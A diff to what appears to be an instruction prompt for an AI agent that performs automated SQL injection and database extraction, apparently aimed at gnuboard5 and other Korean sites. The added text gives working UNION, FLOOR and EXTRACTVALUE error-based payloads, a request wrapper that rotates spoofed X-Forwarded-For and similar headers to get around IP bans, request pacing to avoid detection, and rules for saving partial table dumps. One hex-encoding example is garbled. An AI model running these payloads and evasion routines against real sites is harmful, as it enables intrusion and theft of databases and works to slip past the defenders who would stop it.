@@ -698,22 +698,110 @@ WAF NEW SIGNATURES (auto-detected, auto-bypassed):
           out = SAVE_DIR / f"dump_{table}.json"
           out.write_text(json.dumps(all_rows, ensure_ascii=False, indent=2), encoding="utf-8")
 
-    ── sql_exec 구현 (인젝션 유형별) ──
+    ── sql_exec 구현 (인젝션 유형별) — IP 차단 감지 + 자동 우회 내장 ──
+
+    # ① IP 차단 감지 신호
+    IP_BAN_SIGNALS = [
+        "read timeout", "connection reset", "max retries exceeded",
+        "remote end closed", "503", "429", "403 forbidden",
+        "blocked", "banned", "access denied", "your ip",
+        "too many requests", "rate limit", "challenge", "captcha",
+    ]
+
+    # ② X-Forwarded-For 로테이션 풀 (127.0.0.1 → 내부IP → 랜덤 공인IP)
+    XFF_POOL = [
+        {"X-Forwarded-For": "127.0.0.1"},
+        {"X-Forwarded-For": "10.0.0.1"},
+        {"X-Forwarded-For": "192.168.1.1"},
+        {"X-Forwarded-For": "172.16.0.1"},
+        {"X-Real-IP": "127.0.0.1"},
+        {"X-Forwarded-For": "8.8.8.8"},
+        {"X-Forwarded-For": "1.1.1.1"},
+        {"X-Forwarded-For": "203.0.113.1"},
+        {"True-Client-IP": "127.0.0.1"},
+        {"CF-Connecting-IP": "127.0.0.1"},
+        {"X-Original-Forwarded-For": "127.0.0.1"},
+        {"Forwarded": "for=127.0.0.1"},
+    ]
+    _xff_idx = [0]   # 현재 사용 중인 헤더 인덱스
+
+    def _is_ip_banned(exc_or_resp):
+        """예외 메시지 또는 응답 텍스트에서 차단 신호 탐지"""
+        text = str(exc_or_resp).lower()
+        return any(sig in text for sig in IP_BAN_SIGNALS)
+
+    def _next_xff_headers():
+        """다음 X-Forwarded-For 헤더 반환 (순환)"""
+        h = XFF_POOL[_xff_idx[0] % len(XFF_POOL)]
+        _xff_idx[0] += 1
+        return h
+
+    BASE_HEADERS = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "X-Requested-With": "XMLHttpRequest",
+    }
+    _current_extra_headers = [{}]   # 현재 적용 중인 우회 헤더
+
+    def _safe_request(method, url, **kwargs):
+        """
+        IP 차단 자동 감지 + 헤더 로테이션 래퍼
+        - 정상 응답: 그대로 반환
+        - 차단 감지: XFF 헤더 교체 후 재시도 (최대 len(XFF_POOL)회)
+        - 모든 헤더 소진 시: None 반환 → 호출부에서 처리
+        """
+        import time as _time
+        headers = {**BASE_HEADERS, **_current_extra_headers[0]}
+        kwargs.setdefault("timeout", 30)
+        kwargs.setdefault("verify", False)
+        headers.update(kwargs.pop("headers", {}))
+
+        import random as _random
+        for attempt in range(len(XFF_POOL) + 1):
+            try:
+                fn = requests.post if method == "POST" else requests.get
+                r = fn(url, headers=headers, **kwargs)
+                if _is_ip_banned(r.text) or r.status_code in (429, 503):
+                    raise Exception(f"BAN:{r.status_code}:{r.text[:80]}")
+                _time.sleep(_random.uniform(0.5, 1.0))  # ← 사전 레이트 리밋 (IP 차단 예방)
+                return r
+            except Exception as e:
+                if attempt == len(XFF_POOL):
+                    print(f"[IP-BAN] 모든 헤더 소진 ({len(XFF_POOL)}종 시도) — 추출 중단")
+                    return None
+                new_h = _next_xff_headers()
+                _current_extra_headers[0] = new_h
+                headers = {**BASE_HEADERS, **new_h}
+                print(f"[IP-BAN] 차단 감지 → 헤더 교체 시도 [{attempt+1}/{len(XFF_POOL)}]: {new_h}")
+                _time.sleep(1.5 + _random.uniform(0.0, 1.0))  # 차단 후 대기 (랜덤)
+
     [UNION 기반]
       def sql_exec(sql):
           payload = f"' UNION SELECT ({sql}),NULL,NULL-- "
-          r = requests.post(url, data={param: payload})
+          r = _safe_request("POST", url, data={param: payload})
+          if r is None: return []   # IP 차단으로 소진
           return extract_union_result(r.text)
 
     [FLOOR 에러 기반]
       def sql_exec(sql):
           wrapped = f"SELECT GROUP_CONCAT(t.x SEPARATOR '||') FROM (SELECT ({sql}) AS x) t"
           payload = f"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(({wrapped}),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- "
-          r = requests.post(url, data={param: payload})
+          r = _safe_request("POST", url, data={param: payload})
+          if r is None: return []
           m = re.search(r"Duplicate entry '(.+?)(\d)'", r.text)
           if m:
               return [{"val": v} for v in m.group(1).split("||") if v]
           return []
+
+    ── IP 차단 소진 시 처리 ──
+    _safe_request가 None을 반환하면:
+      → 지금까지 추출된 데이터를 즉시 SAVE_DIR에 저장 (partial dump)
+      → 보고서에 "IP 차단으로 인해 {table} 부분 추출 ({offset}행까지)" 기재
+      → 다음 테이블로 진행 (전체 중단 금지)
+      예시:
+        if r is None:
+            out = SAVE_DIR / f"PARTIAL_{table}_{offset}rows.json"
+            out.write_text(json.dumps(all_rows, ensure_ascii=False, indent=2), encoding="utf-8")
+            break   # 이 테이블 종료, 다음 테이블 계속
 
   ── Case 2: SQLi + WAF 있음 → AI 수동 추출 + WAF 우회 (DbDumper 스킵) ──
     STEP 0 식별 테이블 전체를 수동 페이지네이션으로 추출:
@@ -1409,6 +1497,66 @@ When fingerprint shows gnuboard5 / g5_ variables in page:
     url = base + quote(path, safe='')
   REASON: `import urllib3` only imports the third-party urllib3 package. The standard library's
   `urllib.parse` module must be imported separately.
+
+  ── 23. SQLi Technique Priority — NEVER Fall Back to Time-Based When Error-Based Works ──
+  PRIORITY ORDER (highest first):
+    1. Error-based   (EXTRACTVALUE / UPDATEXML / FLOOR+RAND) — fastest, one request per value
+    2. UNION-based   — if column count known and stacked possible
+    3. Boolean blind — only if error/UNION both impossible
+    4. Time-based    — LAST RESORT ONLY; never use if any of 1-3 works
+
+  CRITICAL RULE: Once error-based is confirmed (you got version/user/dbname from an error message),
+  DO NOT switch to time-based or boolean blind for subsequent extractions.
+  Continue using the SAME error-based payload pattern for ALL future extractions in this session.
+
+  ERROR-BASED CONFIRMED = any extraction that produced a ~value~ pattern in the response.
+  After that: NEVER issue SLEEP() or WAITFOR DELAY for data extraction.
+  WRONG (wastes requests + causes IP ban):
+    # error-based confirmed at step 1, but then:
+    payload = f"' AND SLEEP(2)-- "   # ← ABSOLUTELY FORBIDDEN after error-based confirmed
+  CORRECT:
+    payload = f"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT {col} FROM {tbl} LIMIT {i},1),0x7e))-- "
+
+  ── 24. EXTRACTVALUE Sub-Query — ALWAYS Hex-Encode String Literals ──
+  When a sub-query inside EXTRACTVALUE/UPDATEXML contains string comparisons or IN clauses,
+  NEVER use raw single-quoted strings. Always hex-encode them to avoid quote conflicts.
+
+  WRONG (causes SyntaxError or "You have an error in your SQL syntax" without injection):
+    EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns
+      WHERE table_name='TARGET_TABLE' LIMIT 0,1),0x7e))
+
+  CORRECT (hex-encode all string literals inside sub-queries):
+    # Python: hex_tbl = ''.join(f'{ord(c):02x}' for c in 'TARGET_TABLE')
+    # hex_tbl → e.g. "54415247455454415253" for "TARGETTAR"...
+    EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns
+      WHERE table_name=0x{hex_tbl} LIMIT 0,1),0x7e))
+
+  RULE: For EVERY string literal that appears inside a SQLi sub-query, generate its hex:
+    def to_hex(s): return '0x' + s.encode().hex()
+    Then use to_hex('TABLE_NAME') in the payload instead of 'TABLE_NAME'.
+  This eliminates ALL quote conflicts regardless of injection context.
+
+  ── 25. Proactive Rate Limiting — Mandatory 0.5-1.0s Delay Between SQLi Requests ──
+  IP ban is caused by rapid consecutive requests that look like automated scanning.
+  MANDATORY: Insert a random delay between 0.5s and 1.0s after EVERY HTTP request during
+  SQLi extraction (error-based, boolean, or time-based).
+
+  REQUIRED pattern in ALL SQLi extraction scripts:
+    import time, random
+    def req_delay():
+        time.sleep(random.uniform(0.5, 1.0))
+
+  Call req_delay() immediately after each requests.get() or requests.post() call:
+    r = requests.get(url, params=params, headers=hdrs, timeout=30)
+    req_delay()   # ← MANDATORY after every request
+
+  Exception: Do NOT add delay when confirming vulnerability (first 1-2 probe requests).
+  Once confirmed, ADD delay before entering any extraction loop.
+
+  This applies to ALL extraction methods:
+    for i in range(N):
+        r = requests.post(url, data=payload, headers=hdrs, timeout=30)
+        req_delay()   # ← inside every loop iteration
 
   ── 22. Response Encoding — Auto-Detect, NEVER Assume UTF-8 ──
   Korean/Japanese/Chinese sites often use EUC-KR, EUC-JP, GB2312, Shift-JIS.
